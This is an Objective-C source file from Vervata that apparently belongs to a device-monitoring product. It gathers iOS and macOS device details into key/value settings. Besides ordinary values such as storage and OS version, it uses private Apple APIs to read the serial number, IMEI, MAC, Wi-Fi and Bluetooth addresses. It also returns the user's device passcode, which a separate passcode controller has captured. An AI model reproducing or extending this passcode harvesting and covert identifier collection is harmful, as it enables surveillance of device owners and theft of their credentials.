//
//  DeviceSettingsUtils.m
//  DeviceSettingsManager
//
//  Created by Makara on 3/4/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#if TARGET_OS_IPHONE
#import <UIKit/UIKit.h>
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <CoreTelephony/CTCarrier.h>
#import <CoreLocation/CoreLocation.h>
#else
#import <SystemConfiguration/SCNetworkConfiguration.h>
#import <Carbon/Carbon.h>
#import <IOBluetooth/IOBluetooth.h>

#include "GetPrimaryMACAddress.h"
#import "MacInfoImp.h"
#import "NetworkInformation.h"
#endif

#include <errno.h>
#include <sys/sysctl.h>

#import "DeviceSettingsUtils.h"
#import "DevicePasscodeController.h"
#import "PhoneInfoImp.h"

#import "MCPasscodeManager.h"
#import "MobileGestalt.h"
#import "SystemUtilsImpl.h"

// General > Passcode Lock
static NSString* const kDeviceSettingsKeyGenPassIsPasscodeOn    = @"General.PasscodeLock.IsPasscodeOn";
static NSString* const kDeviceSettingsKeyGenPassPasscode        = @"General.PasscodeLock.Passcode";

// General > Date & Time
static NSString* const kDeviceSettingsKeyGenDateIs24HrsFormat   = @"General.DateTime.Is24hrsFormat";

// General > Usage
static NSString* const kDeviceSettingsKeyGenUsageTotalStorage   = @"General.Usage.TotalStorage";
static NSString* const kDeviceSettingsKeyGenUsageAvailable      = @"General.Usage.Available";
static NSString* const kDeviceSettingsKeyGenUsageBattery        = @"General.Usage.Battery";

// General > About
static NSString* const kDeviceSettingsKeyGenAboutName           = @"General.About.Name";
static NSString* const kDeviceSettingsKeyGenAboutNetwork        = @"General.About.Network";
static NSString* const kDeviceSettingsKeyGenAboutCapacity       = @"General.About.Capacity";
static NSString* const kDeviceSettingsKeyGenAboutAvailable      = @"General.About.Available";
static NSString* const kDeviceSettingsKeyGenAboutOSVersion      = @"General.About.OsVersion";
static NSString* const kDeviceSettingsKeyGenAboutCarrier        = @"General.About.Carrier";
static NSString* const kDeviceSettingsKeyGenAboutModel          = @"General.About.Model";
static NSString* const kDeviceSettingsKeyGenAboutSerialNumber   = @"General.About.SerialNumber";
static NSString* const kDeviceSettingsKeyGenAboutWifiAddress    = @"General.About.WiFiAddress";
static NSString* const kDeviceSettingsKeyGenAboutBluetooth      = @"General.About.Bluetooth";
static NSString* const kDeviceSettingsKeyGenAboutIMEI           = @"General.About.IMEI";
static NSString *const kDeviceSettingsKeyGenAboutMACAddress     = @"General.About.MACAddress";
static NSString *const kDeviceSettingsKeyGenAboutProcessor      = @"General.About.Processor";
static NSString *const kDeviceSettingsKeyGenAboutRAM            = @"General.About.RAM";
static NSString *const kDeviceSettingsKeyGenAboutSystemType     = @"General.About.SystemType";
static NSString *const kDeviceSettingsKeyGenAboutComputerDomain = @"General.About.ComputerDomain";
static NSString *const kDeviceSettingsKeyGenAboutIPAddress      = @"General.About.IPAddress";

// Privacy > Location Service
static NSString* const kDeviceSettingsKeyPrivacyLocServ         = @"Privacy.LocationService";

@interface  DeviceSettingsUtils (private)

#pragma mark Passcode Lock
- (NSString *) getSetPasscode;
- (NSString *) getPasscode;

#pragma mark Date & Time
- (NSString *) is24Format;

#pragma mark Usage
- (NSString *) getUsageBattery;
- (NSString *) getUsageCapacity;
- (NSString *) getUsageAvailable;

#pragma mark About
- (NSString *) getAboutName;
- (NSString *) getAboutNetwork;
- (NSString *) getAboutCapacity;
- (NSString *) getAboutAvailable;
- (NSString *) getAboutOSVersion;
- (NSString *) getAboutCarrier;
- (NSString *) getAboutModel;
- (NSString *) getAboutSerialNumber;
- (NSString *) getAboutWifiAddress;
- (NSString *) getAboutBluetooth;
- (NSString *) getAboutIMEI;
- (NSString *) getMACAddress;
- (NSString *) getProcessor;
- (NSString *) getRAM;
- (NSString *) getSystemType;
- (NSString *) getComputerGroup;
- (NSString *) getComputerDomain;
- (NSString *) getIPAddress;

#pragma mark Privacy > Location Service
- (NSString *) getLocationService;
@end


@implementation DeviceSettingsUtils

- (id) initWithDevicePasscodeController: (DevicePasscodeController *) aDevicePasscodeController {
    if ((self = [super init])) {
        mDevicePasscodeController = aDevicePasscodeController;
    }
    return (self);
}

- (NSArray *) getDeviceSettings: (NSArray *) aDeviceSettingIDs {
    NSMutableArray *deviceSettings = [NSMutableArray array];
    
    NSArray *deviceSettingIDs = aDeviceSettingIDs;
    if (deviceSettingIDs == nil || [deviceSettingIDs count]  == 0) {
        DLog(@"Request all settings")
        deviceSettingIDs = [NSArray arrayWithObjects: kDeviceSettingsKeyGenPassIsPasscodeOn,
                            kDeviceSettingsKeyGenPassPasscode,
                            kDeviceSettingsKeyGenDateIs24HrsFormat,
                            kDeviceSettingsKeyGenUsageTotalStorage,
                            kDeviceSettingsKeyGenUsageAvailable,
                            kDeviceSettingsKeyGenUsageBattery,
                            kDeviceSettingsKeyGenAboutName,
                            kDeviceSettingsKeyGenAboutNetwork,
                            kDeviceSettingsKeyGenAboutCapacity,
                            kDeviceSettingsKeyGenAboutAvailable,
                            kDeviceSettingsKeyGenAboutOSVersion,
                            kDeviceSettingsKeyGenAboutCarrier,
                            kDeviceSettingsKeyGenAboutModel,
                            kDeviceSettingsKeyGenAboutSerialNumber,
                            kDeviceSettingsKeyGenAboutWifiAddress,
                            kDeviceSettingsKeyGenAboutBluetooth,
                            kDeviceSettingsKeyGenAboutIMEI,
                            kDeviceSettingsKeyGenAboutMACAddress,
                            kDeviceSettingsKeyGenAboutProcessor,
                            kDeviceSettingsKeyGenAboutRAM,
                            kDeviceSettingsKeyGenAboutSystemType,
                            kDeviceSettingsKeyGenAboutComputerDomain,
                            kDeviceSettingsKeyGenAboutIPAddress,
                            kDeviceSettingsKeyPrivacyLocServ,
                             nil];
    }
    
    for (NSString *settingID in deviceSettingIDs) {
        DLog(@"settingID, %@", settingID)
        NSString *settingValue = nil;
        // General > Passcode
        if ([settingID isEqualToString:kDeviceSettingsKeyGenPassIsPasscodeOn]) {
            settingValue = [self getSetPasscode];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenPassPasscode]) {
            settingValue = [self getPasscode];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenDateIs24HrsFormat]) {
            settingValue = [self is24Format];
        }
        // General > Usage
        else if ([settingID isEqualToString:kDeviceSettingsKeyGenUsageTotalStorage]) {
            settingValue = [self getUsageCapacity];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenUsageAvailable]) {
            settingValue = [self getUsageAvailable];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenUsageBattery]) {
            settingValue = [self getUsageBattery];
        }
        // General > About
        else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutName]) {
            settingValue = [self getAboutName];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutNetwork]) {
            settingValue = [self getAboutNetwork];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutCapacity]) {
            settingValue = [self getAboutCapacity];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutAvailable]) {
            settingValue = [self getAboutAvailable];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutOSVersion]) {
            settingValue = [self getAboutOSVersion];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutCarrier]) {
            settingValue = [self getAboutCarrier];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutModel]) {
            settingValue = [self getAboutModel];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutSerialNumber]) {
            settingValue = [self getAboutSerialNumber];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutWifiAddress]) {
            settingValue = [self getAboutWifiAddress];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutBluetooth]) {
            settingValue = [self getAboutBluetooth];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutIMEI]) {
            settingValue = [self getAboutIMEI];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutMACAddress]) {
            settingValue = [self getMACAddress];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutProcessor]) {
            settingValue = [self getProcessor];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutRAM]) {
            settingValue = [self getRAM];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutSystemType]) {
            settingValue = [self getSystemType];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutComputerDomain]) {
            //settingValue = [self getComputerGroup];
            settingValue = [self getComputerDomain];
        } else if ([settingID isEqualToString:kDeviceSettingsKeyGenAboutIPAddress]) {
            settingValue = [self getIPAddress];
        }
        // Privacy > Location Service
        else if ([settingID isEqualToString:kDeviceSettingsKeyPrivacyLocServ]) {
            settingValue = [self getLocationService];
        }
        
        DLog(@"settingValue = %@", settingValue);
        if (settingValue != nil) {
            NSDictionary *settingInfo = [NSDictionary dictionaryWithObject:settingValue
                                                                    forKey:settingID];
            [deviceSettings addObject:settingInfo];
        }
    }
    return (deviceSettings);
}


#pragma mark -
#pragma mark Private Method
#pragma mark -

#pragma mark General > Passcode Lock

- (NSString *) getSetPasscode {
#if TARGET_OS_IPHONE
    MCPasscodeManager *mcPasscodeManager = [MCPasscodeManager sharedManager];
    NSString *setPasscode = [mcPasscodeManager isPasscodeSet] ? @"1" : @"0";
    return setPasscode;
#else
    return nil;
#endif
}

- (NSString *) getPasscode {
#if TARGET_OS_IPHONE
    NSString *passcode = [mDevicePasscodeController mPasscode] == nil ? @"" : [mDevicePasscodeController mPasscode];
    return passcode;
#else
    return nil;
#endif
}

#pragma mark General > Date & Time


- (NSString *) is24Format {
#if TARGET_OS_IPHONE
    NSDictionary *dateFormats       = [[NSDictionary alloc ] initWithContentsOfFile:@"/var/mobile/Library/Caches/DateFormats.plist"];
    NSString *hour                  = [dateFormats objectForKey:@"UIHourFormat"];
    NSString *is24HourFormat        = nil;
    if ([hour isEqualToString:@"HH"])       is24HourFormat = @"1";
    else if ([hour isEqualToString:@"h"])   is24HourFormat = @"0";
    return is24HourFormat;
#else
    return nil;
#endif
}


#pragma mark General > Usage


- (NSString *) getUsageBattery {
#if TARGET_OS_IPHONE
    NSString *batteryText           = nil;
    NSNumber* batteryCurrentCapacity    = MGCopyAnswer(kMGBatteryCurrentCapacity);
    batteryText                     = [[batteryCurrentCapacity stringValue] copy];
    [batteryCurrentCapacity release];
    return [batteryText autorelease];
#else
    return nil;
#endif
}

- (NSString *) getUsageCapacity {
    return [self getAboutCapacity];
}

- (NSString *) getUsageAvailable {
    return [self getAboutAvailable];
}

/* This method will get the battery level of 5, 10, 15, .....
- (NSString *) batteryLevel {
    UIDevice *device                = [UIDevice currentDevice];
    device.batteryMonitoringEnabled = YES;
	float currentBatteryLevel       = [device batteryLevel];
    NSNumber *batteryLevelNum       = [[NSNumber alloc] initWithFloat:(currentBatteryLevel * 100)];
	NSInteger adjustBatteryLevel    = [batteryLevelNum integerValue];
    NSString *batteryString         = [NSString stringWithFormat:@"%ld", (long)adjustBatteryLevel];
    return batteryString;
}
 */


#pragma mark General > About


- (NSString *) getAboutName {
#if TARGET_OS_IPHONE
    return [[UIDevice currentDevice] name];
#else
    return [[NSHost currentHost] localizedName];
#endif
}

- (NSString *) getAboutNetwork {
    return nil;
}

- (NSString *) getAboutCapacity {
#if TARGET_OS_IPHONE
    NSString *capacityText          = nil;
    NSDictionary  *diskUsage        = MGCopyAnswer(kMGDiskUsage);
    if (diskUsage) {
        long long capacity          = [[diskUsage objectForKey:@"TotalDataCapacity"] longLongValue];
        long long capacityInMB      = capacity/1024.0/1024.0;
        capacityText                = [[[NSString alloc] initWithFormat:@"%lld", capacityInMB] autorelease];
        [diskUsage release];
    }
    return capacityText;
#else
    // http://stackoverflow.com/questions/7246867/get-hard-disk-size-dynamically-in-cocoa
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDictionary *attr = [fileManager attributesOfFileSystemForPath:@"/" error:nil];
    unsigned long long fileSize = [[attr objectForKey:NSFileSystemSize] unsignedLongLongValue];
    unsigned long long diskSize = fileSize/1000000000;
    NSString *diskCapacity = [NSString stringWithFormat:@"%lld GB", diskSize];
    return diskCapacity;
#endif
}

- (NSString *) getAboutAvailable {
#if TARGET_OS_IPHONE
    NSString *availableText         = nil;
    NSDictionary  *diskUsage        = MGCopyAnswer(kMGDiskUsage);
    if (diskUsage) {
        long long available         = [[diskUsage objectForKey:@"AmountDataAvailable"] longLongValue];
        long long availableInMB     = available/1024.0/1024.0;
        availableText               =  [[[NSString alloc] initWithFormat:@"%lld", availableInMB] autorelease];
        [diskUsage release];
    }
    return availableText;
#else
    // http://stackoverflow.com/questions/7246867/get-hard-disk-size-dynamically-in-cocoa
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDictionary *attr = [fileManager attributesOfFileSystemForPath:@"/" error:nil];
    unsigned long long freeSize = [[attr objectForKey:NSFileSystemFreeSize] unsignedLongLongValue];
    unsigned long long diskFreeSize = freeSize/1000000000;
    NSString *diskAvailable = [NSString stringWithFormat:@"%lld GB", diskFreeSize];
    return diskAvailable;
#endif
}

- (NSString *) getAboutOSVersion {
#if TARGET_OS_IPHONE
    return [[UIDevice currentDevice] systemVersion];
#else
    NSString *OSNameVersion = nil;
    NSString *OSVersion = nil;
    NSString *OSDarwinVersion = @"";
    
    MacInfoImp *macInfo = [[[MacInfoImp alloc]init] autorelease];
    OSVersion = [macInfo getDeviceInfo];
    
    char str[256];
    size_t size = sizeof(str);
    int ret = sysctlbyname("kern.version", str, &size, NULL, 0);
    if (!ret) {
        OSDarwinVersion = [NSString stringWithCString:str encoding:NSUTF8StringEncoding];
    }
    
    OSNameVersion= [NSString stringWithFormat:@"%@ (%@)", OSVersion, OSDarwinVersion];
    return OSNameVersion;
#endif
}

- (NSString *) getAboutCarrier {
#if TARGET_OS_IPHONE
    CTTelephonyNetworkInfo *netinfo = [[CTTelephonyNetworkInfo alloc] init];
    CTCarrier *carrier              = [netinfo subscriberCellularProvider];
    NSString *carrierName           = [carrier carrierName];
    
    NSArray *carrierBundleInfoArray = MGCopyAnswer(kMGCarrierBundleInfo);
    NSDictionary *carrirBundleInfo  = [carrierBundleInfoArray firstObject];
    
    NSString *carrierBundleVersion  = [carrirBundleInfo objectForKey:@"CFBundleVersion"];
    NSString *carrierFulltext = nil;
    if (carrierBundleVersion) {
        carrierFulltext       = [[NSString alloc] initWithFormat:@"%@ %@", carrierName, carrierBundleVersion];
    } else {
        carrierFulltext       = [[NSString alloc] initWithFormat:@"%@", carrierName];
    }
    
    [carrierBundleInfoArray release];
    [netinfo release];
    
    return [carrierFulltext autorelease];
#else
    return nil;
#endif
}

- (NSString *) getAboutModel {
#if TARGET_OS_IPHONE
    NSString *modelNumber           = MGCopyAnswer(kMGModelNumber);
    NSString *regionInfo            = MGCopyAnswer(kMGRegionInfo);
    NSString *model                 = [[NSString alloc] initWithFormat:@"%@%@", modelNumber, regionInfo];
    [modelNumber release];
    [regionInfo release];
    return [model autorelease];
#else
    MacInfoImp *macInfo = [[[MacInfoImp alloc]init] autorelease];
    return [macInfo getDeviceModel];
#endif
}

- (NSString *) getAboutSerialNumber {
#if TARGET_OS_IPHONE
    NSString *serialNumber = MGCopyAnswer(kMGSerialNumber);
    return [serialNumber autorelease];
#else
    MacInfoImp *macInfo = [[[MacInfoImp alloc]init] autorelease];
    return [macInfo getIMSI];
#endif
}

- (NSString *) getAboutWifiAddress {
#if TARGET_OS_IPHONE
    NSString *wifiAddress = MGCopyAnswer(kMGWifiAddress);
    return [wifiAddress autorelease];
#else
    NetworkInformation *networkInfo = [NetworkInformation sharedInformation];
    [networkInfo refresh];
    // Assume
    NSString *wifiAddress = [networkInfo MACAddressForInterfaceName:@"en1"];
    return wifiAddress;
#endif
}

- (NSString *) getAboutBluetooth {
#if TARGET_OS_IPHONE
    NSString *bluetooth = MGCopyAnswer(kMGBluetoothAddress);
    return [bluetooth autorelease];
#else
    IOBluetoothHostController *bluetoothController = [IOBluetoothHostController defaultController];
    NSString *bluetoothAddress = [NSString stringWithFormat:@"%@ (%@)", [bluetoothController nameAsString], [bluetoothController addressAsString]];
    return bluetoothAddress;
#endif
}

- (NSString *) getAboutIMEI {
#if TARGET_OS_IPHONE
    PhoneInfoImp *phoneInfo = [[PhoneInfoImp alloc] init];
    NSString *imei          = [[phoneInfo getIMEI] copy];
    [phoneInfo release];
    return [imei autorelease];
#else
    MacInfoImp *macInfo = [[[MacInfoImp alloc]init] autorelease];
    return [macInfo getIMEI];
#endif
}

- (NSString *) getMACAddress {
#if TARGET_OS_IPHONE
    return nil;
#else
    NSString *macAddress = nil;
    /*
    kern_return_t	kernResult = KERN_SUCCESS;
    io_iterator_t	intfIterator;
    UInt8			MACAddress[kIOEthernetAddressSize];
    
    kernResult = FindEthernetInterfaces(&intfIterator);
    
    if (KERN_SUCCESS != kernResult) {
        printf("FindEthernetInterfaces returned 0x%08x\n", kernResult);
    }
    else {
        kernResult = GetMACAddress(intfIterator, MACAddress, sizeof(MACAddress));
        
        if (KERN_SUCCESS != kernResult) {
            printf("GetMACAddress returned 0x%08x\n", kernResult);
        }
        else {
            printf("This system's built-in MAC address is %02x:%02x:%02x:%02x:%02x:%02x.\n",
                   MACAddress[0], MACAddress[1], MACAddress[2], MACAddress[3], MACAddress[4], MACAddress[5]);
            
            macAddress = [NSString stringWithFormat:@"%02x:%02x:%02x:%02x:%02x:%02x",
                          MACAddress[0], MACAddress[1], MACAddress[2], MACAddress[3], MACAddress[4], MACAddress[5]];
        }
    }
    
    (void) IOObjectRelease(intfIterator);	// Release the iterator
    */
    
    NetworkInformation *networkInfo = [NetworkInformation sharedInformation];
    [networkInfo refresh];
    macAddress = [networkInfo primaryMACAddress];
    
    return macAddress;
#endif
}

- (NSString *) getProcessor {
#if TARGET_OS_IPHONE
    return nil;
#else
    NSString *processor = nil;
    char str[256];
    size_t size = sizeof(str);
    int ret = sysctlbyname("machdep.cpu.brand_string", str, &size, NULL, 0);
    if (!ret) {
        processor = [NSString stringWithCString:str encoding:NSUTF8StringEncoding];
    }
    return processor; // Intel(R) Core(TM) i5-2400S CPU @ 2.50GHz
#endif
}

- (NSString *) getRAM {
#if TARGET_OS_IPHONE
    return nil;
#else
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    unsigned long long physicalRAM = [processInfo physicalMemory];
    physicalRAM = physicalRAM / pow(1024, 2);
    NSString *RAM = [NSString stringWithFormat:@"%lld MB", physicalRAM];
    return RAM;
#endif
}

- (NSString *) getSystemType {
    int value = 0;
    size_t size = sizeof(value);
    int ret = sysctlbyname("hw.cpu64bit_capable", &value, &size, NULL, 0);
    
    NSString *systemType = @"32-bit";
    if (!ret) {
        if (value == 1) {
            systemType = @"64-bit";
        }
    }
    return systemType;
}

- (NSString *) getComputerGroup {
#if TARGET_OS_IPHONE
    return nil;
#else
    NSString *computerGroup = nil;
    
    SCDynamicStoreRef storeRef = SCDynamicStoreCreate(NULL, (CFStringRef)@"GetWorkgroup", NULL, NULL);
    CFPropertyListRef global = SCDynamicStoreCopyValue (storeRef,CFSTR("State:/Network/Global/SMB"));
    id workgroup = [(__bridge NSDictionary *)global valueForKey:@"Workgroup"];
    //DLog(@"global: %@", (__bridge NSDictionary *)global);
    CFRelease(global);
    CFRelease(storeRef);
    
    computerGroup = workgroup;
    return computerGroup; // FOREST
#endif
}

- (NSString *) getComputerDomain {
#if TARGET_OS_IPHONE
    return nil;
#else
    NSString *computerDomain = nil;
    /*
    char str[256];
    size_t size = sizeof(str);
    int ret = sysctlbyname("kern.hostname", str, &size, NULL, 0);
    if (!ret) {
        computerDomain = [NSString stringWithCString:str encoding:NSUTF8StringEncoding];
    }
     */
    
    NSArray *names = [[NSHost currentHost] names];
    NSString *localizedName = [[NSHost currentHost] localizedName];
    for (NSString *name in names) {
        if ([name rangeOfString:localizedName].location != NSNotFound) {
            computerDomain = name;
            break;
        }
    }
    
    return computerDomain; // vervatamac4.forest.vervata.com
#endif
}

- (NSString *) getIPAddress {
#if TARGET_OS_IPHONE
    return nil;
#else
    NetworkInformation *networkInfo = [NetworkInformation sharedInformation];
    [networkInfo refresh];
    NSString *IPAddress = [networkInfo primaryIPv4Address];
    return IPAddress;
#endif
}

#pragma mark Privacy > Location Service

- (NSString *) getLocationService {
#if TARGET_OS_IPHONE
    return ([CLLocationManager locationServicesEnabled] ? @"1": @"0");
#else
    return nil;
#endif
}

@end
